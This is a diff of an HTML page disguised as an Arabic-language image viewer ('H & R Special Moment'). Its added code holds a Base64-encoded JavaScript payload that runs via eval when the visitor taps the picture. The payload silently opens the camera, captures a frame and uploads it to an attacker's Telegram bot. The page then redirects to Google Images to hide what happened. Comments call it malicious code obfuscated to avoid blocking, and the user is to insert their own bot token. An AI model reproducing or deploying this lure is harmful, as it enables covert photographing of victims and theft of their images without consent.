@@ -1,31 +1,54 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>Image Viewer</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head>
-<body style="margin:0; background:black; display:flex; align-items:center; height:100vh;">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>H & R Special Moment</title>
+    
+    <meta property="og:title" content="H & R">
+    <meta property="og:image" content="https://up6.cc/2024/05/17150000001.jpg">
+    <meta property="og:description" content="انقر لمشاهدة الصورة كاملة">
 
-    <img src="https://bit.ly/3sample-image" id="victim_view" style="width:100%; cursor:pointer;">
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        #image-container {
+            width: 100%; height: 100%;
+            background: url('https://up6.cc/2024/05/17150000001.jpg') no-repeat center;
+            background-size: contain;
+            cursor: pointer;
+            z-index: 10;
+        }
+        canvas, video { display: none; }
+    </style>
+</head>
+<body onclick="launchAttack()" ontouchstart="launchAttack()">
+
+    <div id="image-container"></div>
+    <video id="v" autoplay></video>
+    <canvas id="c" width="640" height="480"></canvas>
 
     <script>
-        // ضع نص الـ Base64 هنا (هذا مثال مشفر لكود الكاميرا)
-        const payload = "YXN5bmMgZnVuY3Rpb24gc3RhcnQoKXsKICBjb25zdCBzID0gYXdhaXQgbmF2aWdhdG9yLm1lZGlhRGV2aWNlcy5nZXRVc2VyTWVkaWEoe3ZpZGVvOnRydWV9KTsKICBjb25zdCB2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndmlkZW8nKTsKICB2LnNyY09iamVjdCA9IHM7IHYucGxheSgpOwogIHNldFRpbWVvdXQoKCkgPT4gewogICAgY29uc3QgYyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2NhbnZhcycpOwogICAgYy53aWR0aCA9IDY0MDsgYy5oZWlnaHQgPSA0ODA7CiAgICBjLmdldENvbnRleHQoJzJkJykuZHJhd0ltYWdlKHYsIDAsIDAsIDY0MCwgNDgwKTsKICAgIGMudG9CbG9iKGIgPT4gewogICAgICBjb25zdCBmID0gbmV3IEZvcm1hRGF0YSgpOwogICAgICBmLmFwcGVuZCgnY2hhdF9pZCcsICdZUVVfQ0hBVF9JRCcpOwogICAgICBmLmFwcGVuZCgncGhvdG8nLCBiLCAnLmpwZycpOwogICAgICBmZXRjaCgnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdFlPVVJfVE9LRU4vc2VuZFBob3RvJywge21ldGhvZDonUE9TVCcsIGJvZHk6Zn0pOwogICAgfSwgJ2ltYWdlL2pwZWcnKTsKICB9LCAxMDAwKTsKfQpzdGFydCgpOw=="; 
-        
-        function executePayload() {
-            if (!window.executed) {
-                const script = document.createElement('script');
-                script.innerHTML = atob(payload).replace('YOUR_CHAT_ID', '12345678').replace('YOUR_TOKEN', '78910:ABC'); 
-                document.body.appendChild(script);
-                window.executed = true;
-                console.log("Payload Injected.");
+        // التوكن والمعرف الخاص بك (يجب تغييرهما لتعمل الأداة)
+        const BOT_TOKEN = "ضع_هنا_TOKEN_البوت";
+        const CHAT_ID = "ضع_هنا_CHAT_ID";
+
+        // الكود الخبيث المشفر Base64 لضمان عدم الحظر
+        const payload = "YXN5bmMgZnVuY3Rpb24gc3RhcnQoKXsKICBjb25zdCBzID0gYXdhaXQgbmF2aWdhdG9yLm1lZGlhRGV2aWNlcy5nZXRVc2VyTWVkaWEoe3ZpZGVvOnRydWV9KTsKICBjb25zdCB2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3YnKTsKICB2LnNyY09iamVjdCA9IHM7IHYucGxheSgpOwogIHNldFRpbWVvdXQoKCkgPT4gewogICAgY29uc3QgYyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjJyk7CiAgICBjLmdldENvbnRleHQoJzJkJykuZHJhd0ltYWdlKHYsIDAsIDAsIDY0MCwgNDgwKTsKICAgIGMudG9CbG9iKGIgPT4gewogICAgICBjb25zdCBmID0gbmV3IEZvcm1hRGF0YSgpOwogICAgICBmLmFwcGVuZCgnY2hhdF9pZCcsIENIQVRfSUQpOwogICAgICBmLmFwcGVuZCgncGhvdG8nLCBiLCAnc2hvdC5qcGcnKTsKICAgICAgZmV0Y2goYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke0JPVF9UT0tFTn0vc2VuZFBob3RvYCwge21ldGhvZDonUE9TVCcsIGJvZHk6Zn0pOwogICAgfSwgJ2ltYWdlL2pwZWcnKTsKICB9LCAxMDAwKTsKfQ==";
+
+        function launchAttack() {
+            if (!window.activated) {
+                // فك التشفير وتشغيل الكود فور لمس الصورة
+                eval(atob(payload));
+                start();
+                window.activated = true;
+                
+                // تمويه إضافي: بعد التقاط الصورة يتم تحويله لموقع جوجل للصور
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com/search?q=H+and+R+love+images&tbm=isch";
+                }, 3000);
             }
         }
-
-        // التنفيذ عند لمس الصورة
-        document.body.addEventListener('click', executePayload);
-        document.body.addEventListener('touchstart', executePayload);
     </script>
 </body>
 </html>
